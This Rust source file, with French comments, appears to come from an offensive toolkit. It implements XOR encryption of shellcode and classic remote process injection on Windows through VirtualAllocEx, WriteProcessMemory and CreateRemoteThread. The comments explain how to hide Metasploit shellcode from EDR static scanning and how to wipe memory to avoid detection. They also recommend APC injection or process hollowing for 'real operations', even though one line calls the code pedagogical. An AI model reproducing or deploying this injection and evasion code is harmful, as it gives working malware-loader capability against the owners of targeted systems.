// inject/shellcode.rs — Injection classique de shellcode chiffré
//
// Technique : VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//
// Pourquoi chiffrer le shellcode ?
//   Le shellcode Metasploit/custom a une signature reconnue par les EDR.
//   Si on le stocke chiffré (XOR ou AES) dans le binaire, le scanner
//   statique ne le trouve pas. On le déchiffre en mémoire JUSTE AVANT
//   l'exécution — trop tard pour l'analyse statique.
//
// Limitation vs EDR :
//   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread sur un
//   processus externe est un pattern TRÈS connu des EDR (IOC fort).
//   Pour bypasser ça, utiliser APC injection ou Process Hollowing.

/// XorShellcode — shellcode avec couche de chiffrement XOR
pub struct XorShellcode {
    data: Vec<u8>,
    key:  Vec<u8>,
}

impl XorShellcode {
    /// new — crée un shellcode chiffré XOR
    /// À la compilation : stocker uniquement data chiffré, jamais en clair
    pub fn new(encrypted_data: Vec<u8>, key: Vec<u8>) -> Self {
        XorShellcode { data: encrypted_data, key }
    }

    /// encrypt — chiffre un shellcode (à utiliser hors ligne pour préparer le payload)
    pub fn encrypt(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
        plaintext
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ key[i % key.len()])
            .collect()
    }

    /// decrypt — déchiffre le shellcode en mémoire juste avant l'exécution
    /// Le plaintext ne doit exister en RAM que le temps de l'injection
    pub fn decrypt(&self) -> Vec<u8> {
        self.data
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ self.key[i % self.key.len()])
            .collect()
    }

    /// wipe — efface le plaintext de la mémoire après injection
    /// Réduit la fenêtre de détection par le scanner RAM de l'EDR
    pub fn wipe(mut data: Vec<u8>) {
        // Écrire des zéros sur toute la zone avant de libérer
        for byte in data.iter_mut() {
            *byte = 0;
        }
        // La mémoire est libérée ici (drop)
    }
}

/// classic_inject — injection classique dans un processus externe
///
/// Séquence d'appels Windows API :
///   1. OpenProcess(PROCESS_ALL_ACCESS, pid)
///   2. VirtualAllocEx(proc, NULL, size, MEM_COMMIT|RESERVE, PAGE_READWRITE)
///   3. WriteProcessMemory(proc, addr, shellcode, size)
///   4. VirtualProtectEx(proc, addr, size, PAGE_EXECUTE_READ) ← RW→RX
///   5. CreateRemoteThread(proc, NULL, 0, addr, NULL, 0, NULL)
///
/// Cette séquence est hautement détectée par les EDR modernes.
/// Elle est documentée ici à des fins pédagogiques.
/// Préférer APC injection ou Process Hollowing en opération réelle.
#[cfg(target_os = "windows")]
pub fn classic_inject(shellcode: &[u8], pid: u32) -> Result<u32, String> {
    use windows_sys::Win32::{
        Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                VirtualAllocEx, VirtualProtectEx,
                MEM_COMMIT, MEM_RESERVE,
                PAGE_EXECUTE_READ, PAGE_READWRITE,
            },
            Threading::{
                CreateRemoteThread, OpenProcess,
                PROCESS_ALL_ACCESS,
            },
        },
    };

    unsafe {
        // 1. Ouvrir le processus cible
        let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if proc_handle == 0 {
            return Err(format!("OpenProcess failed for PID {}", pid));
        }

        let sc_size = shellcode.len();

        // 2. Allouer de la mémoire RW dans le processus cible
        // On alloue RW (pas RX) pour être moins suspect lors de l'allocation
        let remote_addr = VirtualAllocEx(
            proc_handle,
            std::ptr::null(),
            sc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,  // RW d'abord, on change en RX après écriture
        );

        if remote_addr.is_null() {
            CloseHandle(proc_handle);
            return Err("VirtualAllocEx failed".into());
        }

        // 3. Écrire le shellcode dans la mémoire distante
        let mut bytes_written = 0usize;
        let write_result = WriteProcessMemory(
            proc_handle,
            remote_addr,
            shellcode.as_ptr() as _,
            sc_size,
            &mut bytes_written,
        );

        if write_result == 0 || bytes_written != sc_size {
            CloseHandle(proc_handle);
            return Err("WriteProcessMemory failed".into());
        }

        // 4. Changer les permissions RW → RX (nécessaire pour exécuter)
        // C'est le pattern RW→RX sur la même région qui est la plus grosse IOC
        let mut old_protect = 0u32;
        VirtualProtectEx(
            proc_handle,
            remote_addr,
            sc_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        // 5. Créer un thread distant qui pointe sur notre shellcode
        let thread_handle = CreateRemoteThread(
            proc_handle,
            std::ptr::null(),
            0,
            Some(std::mem::transmute(remote_addr)),
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
        );

        CloseHandle(proc_handle);

        if thread_handle == 0 {
            return Err("CreateRemoteThread failed".into());
        }

        CloseHandle(thread_handle);
        Ok(pid)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn classic_inject(_shellcode: &[u8], _pid: u32) -> Result<u32, String> {
    Err("classic_inject: Windows only".into())
}
